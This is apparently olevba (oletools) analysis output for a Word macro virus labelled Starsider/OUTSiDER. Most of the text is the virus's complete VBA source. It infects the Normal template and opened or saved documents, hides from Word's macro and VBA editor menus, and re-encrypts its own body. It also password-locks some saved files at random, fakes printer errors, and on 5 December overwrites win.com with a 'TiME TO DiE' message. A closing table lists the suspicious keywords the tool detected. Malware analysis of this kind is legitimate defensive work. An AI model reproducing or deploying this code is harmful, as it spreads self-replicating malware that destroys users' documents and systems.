olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Starsider-759e8cc3ea1745782590e974474c35a4ac59d736
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Starsider-759e8cc3ea1745782590e974474c35a4ac59d736 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim C_DC2 As String
Sub Install()
Dim OS, WinDir, SFile As String
OS = System.OperatingSystem
If OS <> "Windows" Then
Exit Sub
End If
WinDir = Environ("WinDir")
SFile = Dir(WinDir & "\SYSTEM\system.dot")
If SFile = "system.dot" Then
Exit Sub
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = WinDir & "\SYSTEM"
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.Save
Call Decrypt
End Sub
Sub Decrypt()
Dim C_DC1, C_DC2, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Set ADObj = ActiveDocument.VBProject.VBComponents(1).CodeModule
LastLine = ADObj.CountOfLines
Z = Mid(ADObj.Lines(1, 1), 2, 1)
For i = 47 To LastLine
C_DC1 = ADObj.Lines(i, 1)
For X = 2 To Len(C_DC1) - 1
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode + Z
C_DC2 = C_DC2 & Chr(IntCode)
Next X
C_DC2 = C_DC2 & Chr(13)
Next i
C_DC3 = ADObj.Lines(6, 41)
Set BaseObj = CreateObject("Word.Document")
Set ATObj = ActiveDocument.VBProject.VBComponents(1)
ATObj.CodeModule.AddFromString C_DC2
ATObj.CodeModule.AddFromString C_DC3
ATObj.CodeModule.InsertLines 1, "Dim C_DC2 As String"
ATObj.Export Environ("WinDir") & "\SYSTEM\win32vba.vxd"
BaseObj.SaveAs Environ("WinDir") & "\SYSTEM\system.dot", wdFormatTemplate
BaseObj.Close
End Sub
Sub Crypt()
Dim C_DC1, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Randomize
Z = Int((7 * Rnd) + 1)
C_DC2 = ""
C_DC2 = "'" & Z & "'" & Chr(13)
C_DC2 = C_DC2 & "Sub AutoOpen()" & Chr(13)
C_DC2 = C_DC2 & "Application.DisplayRecentFiles = False" & Chr(13)
C_DC2 = C_DC2 & "Call Install" & Chr(13)
C_DC2 = C_DC2 & "End Sub" & Chr(13)
If Dir(Environ("WinDir") & "\SYSTEM\win32vba.vxd") <> "win32vba.vxd" Then
AddIns("system.dot").Installed = False
Exit Sub
End If
Open Environ("WinDir") & "\SYSTEM\win32vba.vxd" For Input As #1
For i = 1 To 9
Line Input #1, C_DC1
Next i
C_DC1 = ""
For i = 1 To 41
Line Input #1, C_DC1
C_DC2 = C_DC2 & C_DC1 & Chr(13)
Next i
C_DC3 = ""
While Not EOF(1)
Line Input #1, C_DC1
For X = 1 To Len(C_DC1)
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode - Z
C_DC3 = C_DC3 & Chr(IntCode)
Next X
If C_DC3 > "" Then
C_DC2 = C_DC2 & "'" & C_DC3 & "'" & Chr(13)
End If
C_DC3 = ""
Wend
C_DC2 = Mid(C_DC2, 1, Len(C_DC2) - 1)
Close #1
End Sub
Sub AutoExec()
Application.DisplayRecentFiles = False
CommandBars("Standard").Controls(2).OnAction = "FileOpen"
CommandBars("Standard").Controls(3).OnAction = "FileSave"
CommandBars("Standard").Controls(4).OnAction = "PrintCurrentDocument"
Call Crypt
Call Outsider
End Sub
Sub DocClose()
On Error Resume Next
If ActiveDocument.Saved = False Then
Call InfectAD
ActiveDocument.Close SaveChanges:=wdPromptToSaveChanges
Else
ActiveDocument.Close
End If
End Sub
Sub FileOpen()
With Dialogs(wdDialogFileOpen)
.Display
If .Name > "" Then
If (.Format = "0") Or (.Format = "1") Then
Documents.Open FileName:=.Name, Format:=.Format
Call InfectAD
ActiveDocument.Save
End If
Documents.Open FileName:=.Name, Format:=.Format
End If
End With
End Sub
Sub FileSave()
On Error Resume Next
If Dir(ActiveDocument.FullName) > "" Then
ActiveDocument.Save
Else
Call FileSaveAs
End If
End Sub
Sub FileSaveAs()
Dim LocalVar As Integer
With Dialogs(wdDialogFileSaveAs)
.Display
If .Name > "" Then
If (.Format = "0") Or (.Format = "1") Then
Randomize
LocalVar = Int((10 * Rnd) + 1)
If LocalVar = 1 Then
Call SetPassword
Else
Call InfectAD
End If
End If
ActiveDocument.SaveAs FileName:=.Name, FileFormat:=.Format
End If
End With
End Sub
Sub FileTemplates()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Dialogs(wdDialogToolsTemplates).Show
End Sub
Sub ViewVBCode()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
Templates(1).Saved = True
AddIns.Unload False
Call ClearAD
CommandBars("Standard").Reset
Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsOptions()
Dim RealPath As String
RealPath = ""
RealPath = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "PROGRAMDIR")
RealPath = RealPath & "\StartUp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = RealPath
If Dialogs(wdDialogToolsOptions).Show = 0 Or -1 Or -2 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = Environ("WinDir") & "\SYSTEM"
End If
End Sub
Sub FilePrint()
If Dialogs(wdDialogFilePrint).Display = -1 Then
Call PrintCurrentDocument
End If
End Sub
Sub PrintCurrentDocument()
On Error Resume Next
Dim NoPrint As Integer
Randomize
NoPrint = Int((Rnd * 3) + 1)
If NoPrint = 3 Then
MsgBox "Ïðèíòåð " & Application.ActivePrinter & " íå íàéäåí", vbOKOnly + vbExclamation, "Îøèáêà ïå÷àòè"
Exit Sub
End If
ActiveDocument.PrintOut
End Sub
Sub ClearAD()
On Error Resume Next
Dim ADLCount, i As Integer
Set ADCodeModule = ActiveDocument.VBProject.VBComponents(1).CodeModule
If ADCodeModule.CountOfLines > 0 Then
ADLCount = ADCodeModule.CountOfLines
ADCodeModule.DeleteLines 1, ADLCount
For i = 1 To 20
ADCodeModule.InsertLines 1, " "
ADCodeModule.DeleteLines 1, 1
Next i
ActiveDocument.Saved = True
End If
End Sub
Sub Outsider()
If (Day(Now) = 5) And (Month(Now) = 12) Then
Dim Buffer As Variant
Dim Buffer1 As Byte
Buffer = Array(184, 16, 3, 185, 0, 1, 51, 210, 205, 19, 195)
Open Environ("WinDir") & "\win.com" For Binary As #1
For i = 1 To 11
Buffer1 = Buffer(i - 1)
Put #1, i, Buffer1
Next i
Close #1
MsgBox Prompt:=Time & " - TiME TO DiE !" & Chr(13) & Chr(13) & "[OUTSiDER]", Title:="OUTSiDER'S MESSAGE"
End If
End Sub
Sub SetPassword()
Dim i As Integer
Dim Passcode As String
Randomize
For i = 1 To 6
RC = Int((9 * Rnd) + 0)
Passcode = Passcode & RC
Next i
ActiveDocument.Password = Passcode
End Sub
Sub InfectAD()
Dim ADLCount, i As Integer
Set ADCodeModule = ActiveDocument.VBProject.VBComponents(1).CodeModule
ADLCount = ADCodeModule.CountOfLines
If ADCodeModule.Lines(2, 1) = "Sub AutoOpen()" Then
Exit Sub
Else
ADCodeModule.DeleteLines 1, ADLCount
ADCodeModule.AddFromString C_DC2
End If
Templates(1).Saved = True
End Sub
'OUTSiDER v1.00'
'East-Kazakhstan, UK'
'10 january 2001 year. 11:00 am'
'New encrypt and stealth algorithm'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
